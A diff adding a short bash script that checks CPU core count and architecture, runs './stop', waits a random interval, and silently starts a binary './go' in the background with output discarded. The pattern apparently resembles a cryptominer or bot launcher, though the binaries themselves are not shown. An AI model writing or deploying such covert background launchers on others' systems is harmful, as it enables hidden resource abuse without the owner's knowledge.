@@ -1,0 +1,32 @@
+#!/bin/bash
+PR=1
+PR=$(cat /proc/cpuinfo | grep model | grep name | wc -l)
+
+ARCH=`uname -m`
+if [ "$ARCH" == "x86_64" ]; then
+	if [ $PR -lt 7 ]; then
+		sleep 15
+		./stop
+		sleep 3
+		RANGE=240
+		s=$RANDOM
+		let "s %= $RANGE"
+		sleep $s
+		#nohup ./golan >>/dev/null &
+		#sleep 20m && 
+		nohup ./go >>/dev/null &	
+	fi
+	if [ $PR -gt 7 ]; then
+		#sleep 15
+		#./stop
+		sleep 3
+		#nohup ./golan >>/dev/null &
+	fi
+else		
+	#nohup ./golan >>/dev/null &
+	#sleep 20m && 
+	nohup ./go >>/dev/null &
+fi
+
+
+
